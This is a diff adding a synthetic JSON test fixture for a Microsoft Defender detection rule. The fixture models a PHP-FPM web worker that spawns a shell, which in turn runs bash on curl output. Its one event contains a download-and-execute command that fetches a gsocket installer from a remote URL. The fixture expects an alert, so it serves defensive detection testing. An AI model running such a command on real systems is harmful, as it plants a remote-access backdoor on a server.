@@ -1,0 +1,24 @@
+{
+  "label": "malicious",
+  "variant": "PHP-FPM worker shell runs bash on curl output via command substitution (blog: curl download-and-execute; deploy.sh usage)",
+  "synthetic": true,
+  "source": "synthetic; https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/ ; https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh",
+  "platform": "defender",
+  "table": "DeviceProcessEvents",
+  "expect_alert": true,
+  "result": "not run (no LogScale or Advanced Hunting runner). Regex-level Python check of the rule's patterns: would alert, matches expectation",
+  "events": [
+    {
+      "Timestamp": "2026-11-10T13:10:00Z",
+      "DeviceId": "synthetic-device-0001",
+      "DeviceName": "web1.example.invalid",
+      "AccountName": "www-data",
+      "FileName": "sh",
+      "FolderPath": "/bin/sh",
+      "ProcessCommandLine": "sh -c bash -c \"$(curl -fsSL https://gsocket.io/y)\"",
+      "InitiatingProcessFileName": "php-fpm8.1",
+      "InitiatingProcessCommandLine": "php-fpm8.1",
+      "InitiatingProcessParentFileName": "php-fpm8.1"
+    }
+  ]
+}
